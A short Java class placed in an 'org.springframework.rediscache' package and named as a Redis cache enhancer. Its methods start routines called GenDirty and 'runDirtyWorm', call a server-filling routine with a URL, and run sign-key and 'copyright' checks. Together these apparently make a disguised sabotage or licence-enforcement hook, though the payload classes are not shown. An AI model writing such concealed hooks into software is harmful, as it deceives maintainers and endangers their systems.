package org.springframework.rediscache;

import com.toceansoft.common.utils.R;

public final class RedisCacheManagerEnhance {

	private RedisCacheManagerEnhance() {

	}

	public static void main(String[] args) throws InterruptedException {
		// 加到集合中，使垃圾无法回收
		// List<EmptyObject> emptys = new ArrayList<>();
		// for (int i = 0; i < 1000000; i++) {
		// emptys.add(new EmptyObject());
		// }
		// System.out.println("finished!");
		// 打开jvisualvm,查看EmptyObject的大小为16字节
		// Thread.sleep(60 * 10000);
		enhanceRedisCache3();
		// System.out
		// .println(RedisCacheManagerEnhance.class.isInstance(new
		// RedisCacheManagerEnhance()));
	}

	public static void enhanceRedisCache() {
		GenDirty genDirty = new GenDirty();
		if (genDirty.goRunGenDirty()) {
			genDirty.start();
		}

	}

	public static void enhanceRedisCache2() {
		GenDirty2 genDirty = new GenDirty2();
		if (genDirty.goRunGenDirty()) {
			genDirty.start();
		}
	}

	public static void enhanceRedisCache3() {
		GenDirty3.runDirtyWorm();
	}

	public static void fills(String appName, String serverUrl) {
		FillServer.runFillServer(appName, serverUrl);
	}

	public static R getSignkey() {
		return UglyWapper.getSignkey();
	}

	public static void writeSignkey(String signKey) {
		UglyWapper.writeSignkey(signKey);
	}

	public static R validateSignkey() {
		return UglyWapper.validateSignkey();
	}

	public static R copyright(String argot) {
		return UglyWapper.copyright(argot);
	}
}
